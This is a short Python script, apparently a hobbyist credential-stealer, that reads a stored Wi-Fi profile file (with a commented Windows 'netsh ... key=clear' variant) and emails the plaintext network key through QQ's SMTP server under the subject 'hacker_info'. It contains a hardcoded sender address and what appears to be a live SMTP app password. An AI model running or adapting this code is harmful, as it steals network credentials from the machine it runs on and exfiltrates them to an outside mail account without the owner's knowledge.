import subprocess, smtplib
from email.mime.text import MIMEText
from email.header import Header 

def send_mail(email, towho, password, message):
    server = smtplib.SMTP("smtp.qq.com")
    server.starttls()
    server.login(email, password)
    server.sendmail(email, towho, message)
    server.quit()

def combine_info(subject, fromwho, towho, message):
    msg = MIMEText(message, "plain", "utf-8")
    msg["Subject"] = Header(subject, "utf-8")
    msg["from"] = fromwho
    msg["to"] = towho
    return msg

fromwho, towho = "1533724109@qq.com", "1533724109@qq.com"
#command = "netsh wlan0 show profile CMCC-92 key=clear"
command = "cat /etc/NetworkManager/system-connections/CMCC-92"
result = subprocess.check_output(command, shell=True)
message = combine_info("hacker_info", fromwho, towho, result)
#print(message)
send_mail(fromwho, towho, "kaemtvxmktzljcdg", message.as_string())
